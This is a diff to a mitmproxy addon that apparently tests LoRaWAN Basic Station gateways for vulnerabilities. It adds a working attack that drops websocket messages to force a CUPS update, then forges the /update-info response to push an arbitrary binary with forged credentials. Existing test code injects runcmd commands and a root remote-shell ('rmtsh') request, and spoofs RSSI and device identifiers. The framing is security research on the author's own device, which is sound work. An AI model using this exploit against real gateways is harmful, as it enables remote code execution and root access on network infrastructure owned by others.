@@ -10,6 +10,7 @@ class Test(Enum):
     spoofDevEUI = 'spoofDevEUI'
     # https://doc.sm.tc/station/tcproto.html#remote-commands
     injectRCE= 'injectRCE'
+    injectRceCUPS='injectRceCUPS'
 
 
 class LNSInterceptor:
@@ -83,7 +84,7 @@ class LNSInterceptor:
         if flow.websocket is not None:
             timestamp = self.timestamp_now()
             message = flow.websocket.messages[-1]
-            
+
             try:
                 content = json.loads(message.content)
             except json.JSONDecodeError:
@@ -147,7 +148,9 @@ class CUPSInterceptor:
         except Exception as e:
             ctx.log.info(f"[{timestamp}] Error processing HTTP response: {e}")
 
-
+# this class is used for vulnerability testing such as forging/injection/message dropping.
+# it's quiet complicate to factorize a clean code as some handlers must be used in only one case.
+# for exemple not every test case can be run in wss_message handler. Some cases must be run in response because must intercept https response only.
 class TestSamples:
     def __init__(self)-> None:
         ctx.log.info(f"init Test Samples")
@@ -155,7 +158,7 @@ class TestSamples:
         # the dev address from our device
         self.own_dev_address = 00000
         # the selected test to run
-        self.selected_test = Test.spoofDevEUI
+        self.selected_test = Test.injectRceCUPS
         # index used to move through the rce commands array
         self.rce_index = 0
         # commands to test for the Test.injectRCE
@@ -165,7 +168,7 @@ class TestSamples:
                         # root@dragino-22af58:~# which mkdir
                         {"msgtype": "runcmd", "command": "/bin/mkdir", "arguments": ['/tmp/RCE_SUCCESS_2']},
                         {"msgtype": "runcmd", "command": "/bin/mkdir /tmp/RCE_SUCCESS_3", "arguments": ['']},
-                        
+
                         # "stop":0  omitted based on doc if want to start a remote shell
                         {"msgtype": "rmtsh","user": "root","term": "xterm-256color","start":1}
                     ]
@@ -176,42 +179,107 @@ class TestSamples:
             Test.spoofDevAddr: self.spoof_dev_addr,
             Test.injectRCE: self.inject_rce
         }
-        
-    def get_property(self, data, property_path):
-        #split all keys based on expected path
-        keys = property_path.split('.')
-        current_data = data
-        
-        for key in keys:
-            # case of iterate over []
-            if isinstance(current_data, list):
-                key = int(key)
-            current_data = current_data[key]
-        return current_data
-
-    def set_property(self, data, property_path, new_value):
-        keys = property_path.split('.')
-        current_data = data
-        for key in keys[:-1]:
-            # case of iterate over []
-            if isinstance(current_data, list):
-                key = int(key)
-            current_data = current_data[key]
-        final_key = keys[-1]
-        if isinstance(current_data, list):
-            final_key = int(final_key)
-        current_data[final_key] = new_value
-    
 
     def timestamp_now(self):
         return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+
+    def build_payload(self, data):
+        payload = bytearray()
+
+        cupsUri = data.get("cupsUri", "")
+        cupsUriLen = len(cupsUri)
+        payload.append(cupsUriLen)
+
+        if cupsUriLen > 0:
+            payload.extend(cupsUri.encode())
+
+        tcUri = data.get("tcUri", "")
+        tcUriLen = len(tcUri)
+        payload.append(tcUriLen)
+
+        if tcUriLen > 0:
+            payload.extend(tcUri.encode())
+
+        cupsCred = data.get("cupsCred", b"")
+        cupsCredLen = len(cupsCred)
+        payload.extend(cupsCredLen.to_bytes(2, byteorder='little'))
+
+        if cupsCredLen > 0:
+            payload.extend(cupsCred)
+
+        tcCred = data.get("tcCred", b"")
+        tcCredLen = len(tcCred)
+        payload.extend(tcCredLen.to_bytes(2, byteorder='little'))
+
+        if tcCredLen > 0:
+            payload.extend(tcCred)
+
+        sig = data.get("sig", b"")
+        sigLen = len(sig)
+        payload.extend(sigLen.to_bytes(4, byteorder='little'))
+
+        keyCRC = data.get("keyCRC", 0)
+        payload.extend(keyCRC.to_bytes(4, byteorder='little'))
+
+        if sigLen > 0:
+            payload.extend(sig)
+
+        updData = data.get("updData", b"")
+        updLen = len(updData)
+        payload.extend(updLen.to_bytes(4, byteorder='little'))
+
+        if updLen > 0:
+            payload.extend(updData)
+
+        return bytes(payload)
     
+    # convert bin to bytes
+    def read_file(self, path):
+        if path:
+            with open(path, 'rb') as f:
+                return f.read()
+        return b''
+
+    # build credential from trust (mitmproxy) cert (none in this case), LNS key provisined by ttn
+    def build_tc_cred(self, trust_path, cert_path, bearer_token):
+        trust = self.read_file(trust_path)
+        cert = self.read_file(cert_path)
+        
+        authorization_bearer = f'Authorization: Bearer {bearer_token}\r\n'
+        authorization_bearer_bytes = authorization_bearer.encode('utf-8')
+        
+        credentials_blob = b''
+        
+        if trust:
+            credentials_blob += trust + b'\r\n'
+        else:
+            credentials_blob += b'\x00\x00\x00\x00'
+
+
+        if cert:
+            credentials_blob += cert + b'\r\n'
+        else:
+            credentials_blob += b'\x00\x00\x00\x00'
+        
+        credentials_blob += authorization_bearer_bytes
+        
+        return credentials_blob
+
     def websocket_message(self, flow: http.HTTPFlow):
         if flow.websocket is not None:
             if self.selected_test in self.test_functions:
-                self.test_functions[self.selected_test](flow)
+                    self.test_functions[self.selected_test](flow)
             else:
-                ctx.log.info(f"No test function found for {self.selected_test.value}")
+                if self.selected_test == Test.injectRceCUPS:
+                    # must drop message to trigger /update-info
+                    try:
+                        flow.websocket.messages[-1].drop()
+                        ctx.log.info(f"Message dropped")
+                    except Exception as e:
+                        ctx.log.error(f"Cannot drop the wss {e}")
+
+                else: 
+                    ctx.log.info(f"No test function found for {self.selected_test.value}")
 
     # only for spoofDevEUI test as it is a https request and not a wss
     def request(self, flow: http.HTTPFlow):
@@ -225,15 +293,45 @@ class TestSamples:
                     flow.request.content = json.dumps(data).encode('utf-8')
                 except json.JSONDecodeError:
                     pass
-            
+    # this handler should be use to intercept https response -> current case for CUPS resp
+    def response(self, flow: http.HTTPFlow):
+        timestamp = self.timestamp_now()
+        #must inject the build payload
+        try:
+            if 'content-type' in flow.response.headers:
+                if flow.request.path == "/update-info": 
+                    if flow.response.headers['content-type'] == 'application/octet-stream':
+                        ctx.log.info(f'Content of request: {str(flow.response.content.hex())}')
+
+                        bin_2_execute = self.read_file('/home/mitmproxy/create_folder')
+
+                        data = {
+                            "cupsUri": "",
+                            "tcUri": "",
+                            "cupsCred": b"",
+                            "tcCred":self.build_tc_cred('/home/mitmproxy/mitmproxy.der', '', 'YOUR_LNS_KEY'),
+                            "sig": b"",
+                            "updData": bin_2_execute
+                        }
+
+                        new_resp = self.build_payload(data)
+
+                        flow.response.content = new_resp
+                        #ctx.log.info(f"Response has been forged:{str(new_resp)}")
+                        ctx.log.info(f"Response has been forged")
+
+        except Exception as e:
+            ctx.log.info(f"[{timestamp}] Error processing HTTP response: {e}")
+
+
 
     def spoof_rssi(self, flow: http.HTTPFlow):
 
         timestamp = self.timestamp_now()
         message = flow.websocket.messages[-1]
-    
+
         ctx.log.info(f"[{timestamp}] Executing: {self.selected_test.value} test")
-    
+
         try:
             content = json.loads(message.content)
         except json.JSONDecodeError:
@@ -241,17 +339,17 @@ class TestSamples:
 
         if message.from_client and flow.websocket is not None:
             try:
-                rssi = self.get_property(content, 'upinfo.rssi')
+                rssi = content['upinfo']['rssi']
                 ctx.log.info(f"[{timestamp}] Dropping current message...")
                 message.drop()
                 # get the rssi from the json
-                
+
                 # modify the rssi and increase it
                 spoofed_rssi = rssi + 2
                 ctx.log.info(f"New rssi set, real value: {rssi}, injected rssi: {spoofed_rssi}")
 
                 # reinject it in the json
-                self.set_property(content, 'upinfo.rssi', spoofed_rssi)
+                content['upinfo']['rssi'] = spoofed_rssi
 
                 # encode the json
                 new_content = json.dumps(content).encode('utf-8')
@@ -275,7 +373,6 @@ class TestSamples:
                 gateway_config = json.dumps(other_gateway_eui).encode('utf-8')
                 ctx.master.commands.call("inject.websocket", flow, message.from_client, gateway_config)
                 ctx.log.info(f"New config injected {other_gateway_eui}")
-    # todo
 
     def spoof_dev_addr(self, flow: http.HTTPFlow):
         ctx.log.info(f"Executing {self.selected_test.value} test")
@@ -297,8 +394,9 @@ class TestSamples:
                 self.rce_index = 0
 
             message.content = command_bytes
-                    
+
 
 # add the current logger as new addon on mitmproxy
 # by default test sample is not enabled
-addons = [LNSInterceptor(), CUPSInterceptor()]
+#addons = [LNSInterceptor(), CUPSInterceptor()]
+addons = [TestSamples()]
